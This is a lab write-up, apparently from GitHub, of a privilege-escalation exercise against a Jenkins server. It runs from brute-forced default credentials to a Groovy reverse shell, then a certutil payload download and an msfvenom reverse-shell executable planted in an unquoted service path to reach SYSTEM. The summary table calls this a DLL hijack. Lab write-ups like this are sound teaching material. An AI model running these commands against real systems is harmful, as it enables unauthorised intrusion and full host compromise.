# Jenkins Privilege Escalation

**Target IP Address:** `192.168.88.136`

---

## Initial Reconnaissance

I began the engagement with a comprehensive Nmap scan to enumerate open ports and detect services and OS information:

```bash
nmap -T4 -p- -A 192.168.88.136
```
<img width="824" height="800" alt="image" src="https://github.com/user-attachments/assets/5483b395-da51-4f07-b404-0e607a8db638" />

The results indicated that port **8080** was open and serving a web application. Upon navigating to `http://192.168.88.136:8080`, I was greeted with a **Jenkins login page**.

<img width="1649" height="584" alt="image" src="https://github.com/user-attachments/assets/e5c7872d-2c77-407c-bb1a-d244de8566aa" />

---

## Credential Brute Force with BurpSuite

To test for weak or default logins, I used **BurpSuite Intruder** with the **FoxyProxy** extension configured in Firefox to intercept login attempts.

1. I attempted another login and intercepted the HTTP request with BurpSuite.
2. I sent this request to **Intruder** to begin a **Cluster Bomb** attack.
3. I configured two payload positions: one for usernames and another for passwords.

<img width="1209" height="456" alt="image" src="https://github.com/user-attachments/assets/24d3c024-ba4b-469b-a6bf-265d596d881e" />
<img width="446" height="433" alt="image" src="https://github.com/user-attachments/assets/aa60d75e-14e0-46c8-9383-c45b03faf444" />
<img width="445" height="435" alt="image" src="https://github.com/user-attachments/assets/f4cd3158-2d10-4d46-b284-274adedfbd08" />

Using common credentials, the attack revealed that:

**Username:** `jenkins`
**Password:** `jenkins`

...resulted in a longer response with **no `loginError`**, indicating a successful login.

<img width="1464" height="665" alt="image" src="https://github.com/user-attachments/assets/b8513d68-89a3-40f9-bc61-2c924a07dffb" />

---

## Remote Code Execution via Jenkins Script Console

Once authenticated, I navigated to:

```
http://192.168.88.136:8080/script
```

This page provides access to the **Jenkins Script Console**, which allows administrators to execute **Groovy scripts** directly on the server. This is an ideal vector for gaining remote code execution (RCE).

### Setting Up Reverse Shell:

1. I set up a netcat listener on my attacker machine:

```bash
nc -nvlp 8044
```

2. I copied a Groovy reverse shell script from [this gist](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) and modified the IP to my attack machine (`192.168.88.128`).

3. I pasted it into the Jenkins Script Console and executed it.

This successfully gave me a reverse shell as the **`butler`** user.

<img width="532" height="164" alt="image" src="https://github.com/user-attachments/assets/549d6c7d-9e86-4343-9ed1-336811da0cf2" />

---

## Privilege Escalation – Enumeration with winPEAS

To identify privilege escalation paths, I transferred and executed `winPEAS` on the target.

### Steps:

1. Downloaded from: [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng/releases)
2. Started a web server on my Kali machine:

```bash
python3 -m http.server 80
```

3. On the compromised machine, ran:

```cmd
certutil.exe -urlcache -f http://192.168.88.128/winPEASx64.exe winpeas.exe
```

4. Executed `winpeas.exe` to enumerate for escalation opportunities.

### Finding:

WinPEAS identified a service with **unquoted service path**:

<img width="891" height="89" alt="image" src="https://github.com/user-attachments/assets/40a7ec1a-718d-416c-9785-a156f948e185" />

This means that Windows will attempt to execute:

* `C:\Program.exe`
* `C:\Program Files.exe`
* `C:\Program Files (x86)\Wise\Wise.exe`

If any of those exist, it will run them **with SYSTEM privileges**.

---

## Exploitation via Unquoted Service Path

### Creating Malicious Executable:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.88.128 LPORT=7777 -f exe > Wise.exe
```

1. Hosted the payload:

```bash
python3 -m http.server 80
```

2. On the victim machine:

```cmd
cd "C:\Program Files (x86)\Wise"
certutil.exe -urlcache -f http://192.168.88.128/Wise.exe Wise.exe
```

3. Set up a netcat listener:

```bash
nc -nvlp 7777
```

### Triggering the Exploit:

To execute the malicious binary with SYSTEM privileges, I restarted the vulnerable service:

```cmd
sc stop WiseBootAssistant
sc start WiseBootAssistant
```

### Result:

I received a reverse shell with **SYSTEM-level privileges**.

<img width="530" height="167" alt="image" src="https://github.com/user-attachments/assets/2e7f5089-89d4-424f-8296-3cd37b37ac91" />

---

## Summary

| Step                 | Details                                     |
| -------------------- | ------------------------------------------- |
| Initial Recon        | Nmap scan revealed Jenkins on port 8080     |
| Initial Foothold     | Brute-forced credentials via BurpSuite      |
| RCE                  | Groovy script execution via Jenkins console |
| Enumeration          | winPEAS revealed unquoted service path      |
| Privilege Escalation | DLL hijack using malicious executable       |
| Final Access         | SYSTEM shell via service restart            |

---

**Status: Pwned**

This engagement demonstrates a typical misconfiguration scenario in CI/CD environments, particularly Jenkins. Default credentials, script consoles, and improper service path permissions are all red flags in production environments.

